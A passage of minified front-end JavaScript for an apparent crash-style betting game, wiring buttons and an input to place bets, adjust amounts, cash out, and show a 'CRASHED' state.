shrink-0`,l.innerText=`CRASHED`,l.setAttribute(`disabled`,`true`)))}l?.addEventListener(`click`,()=>{C===`waiting`&&!w?N(`place_bet`,{amount:T}):C===`flying`&&w&&N(`cashout`)}),document.getElementById(`bet-dec`)?.addEventListener(`click`,()=>P(T-50)),document.getElementById(`bet-inc`)?.addEventListener(`click`,()=>P(T+50)),document.querySelectorAll(`.bet-preset`).forEach(e=>{e.addEventListener(`click`,e=>{let t=e.currentTarget;P(parseInt(t.getAttribute(`data-amount`)||`100`))})}),h?.addEventListener(`input`,e=>{let t=parseInt(e.target.value);isNaN(t)||(T=t)}),j(`waiting`);